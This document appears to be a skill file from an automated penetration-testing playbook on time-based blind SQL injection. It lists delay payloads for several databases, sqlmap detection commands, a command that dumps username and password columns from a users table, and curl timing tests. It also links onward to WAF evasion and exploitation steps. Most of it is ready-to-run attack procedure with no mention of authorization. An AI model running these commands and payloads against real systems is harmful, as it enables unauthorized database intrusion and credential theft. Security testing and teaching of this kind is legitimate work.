# Skill: Time-Based Blind SQL Injection

## Metadata
- Phase: detection
- Techniques: T
- DB Targets: all
- Risk Level: low-medium
- Prerequisites: target URL with injectable parameter

## When to Use

Use as the **last resort** when:
- No DB errors visible (no error-based)
- App returns same response for true/false (no boolean-blind)
- No query results displayed (no UNION)
- No DNS server control (no OOB)

Time-based blind works against **any injectable parameter** by measuring response delays. It is the most universal but slowest technique.

## How Time-Based Blind Works

Injects a conditional delay:
- MySQL: `AND SLEEP(5)` → page takes 5+ seconds if vulnerable
- MSSQL: `WAITFOR DELAY '0:0:5'`
- PostgreSQL: `AND 1=(SELECT 1 FROM PG_SLEEP(5))`

Data is extracted by measuring delay presence:
- Character is 'a': inject `IF(SUBSTR(user,1,1)='a', SLEEP(3), 0)` → delay = true
- No delay = false

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=T \
  --dbms=mysql \
  --batch \
  --level=1 \
  --risk=1 \
  --time-sec=5 \
  --threads=1
```

Note: Use `--threads=1` for time-based. Multiple threads cause false positives from timing noise.

## DBMS-Specific Delay Payloads

| DBMS | Payload |
|------|---------|
| MySQL/MariaDB | `1 AND SLEEP(5)` |
| MSSQL | `1; WAITFOR DELAY '0:0:5'--` |
| PostgreSQL | `1 AND 1=(SELECT 1 FROM PG_SLEEP(5))` |
| Oracle | `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
| SQLite | `1 AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(500000000)))` |

## Manual Verification

```bash
# Quick manual test - does the page delay by ~5 seconds?
time curl "http://target.com/page.php?id=1 AND SLEEP(5)--"

# Compare against baseline
time curl "http://target.com/page.php?id=1"
```

If first request takes 5+ seconds longer, time-based injection works.

## Speed Optimization

Time-based is inherently slow. Minimize extraction scope:

```bash
# Extract only specific table/column
sqlmap -u "TARGET" --technique=T \
  -D target_db -T users -C "username,password" \
  --dump \
  --threads=1

# Use higher --time-sec on slow networks
sqlmap -u "TARGET" --technique=T --time-sec=10

# Use with DNS exfiltration if you gain DNS control later
# -> 30x faster: switch to --technique=Q
```

## Step-by-Step

1. Verify baseline response time (should be <1 second)
2. Run detection command
3. SQLMap will inject `SLEEP(5)` and measure response time
4. Confirm injection point reported
5. Proceed to data extraction (will be slow)

## Expected Output
```
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

## Performance Expectations

| Action | Approximate Time |
|--------|-----------------|
| Detect injection | 30-60 seconds |
| Extract DBMS version | 5-10 minutes |
| Extract DB name | 2-5 minutes |
| Extract table names | 10-30 minutes |
| Dump 100-row table (8 cols) | 2-8 hours |

## Red Flags (wrong skill)
- Network latency is highly variable -> time-based unreliable, get DNS control for OOB
- App has request timeouts < 5 seconds -> use `--time-sec=3` or lower
- Getting inconsistent results -> server load is affecting timing, test off-peak

## Follow-Up
- Injection confirmed -> [Database Enumeration](../03_exploitation/database_enumeration.md) (be patient)
- If OOB DNS possible -> [OOB/DNS](oob_dns.md) (30x faster)
- WAF blocking SLEEP -> [WAF Evasion](../02_waf_evasion/tamper_selection_guide.md)
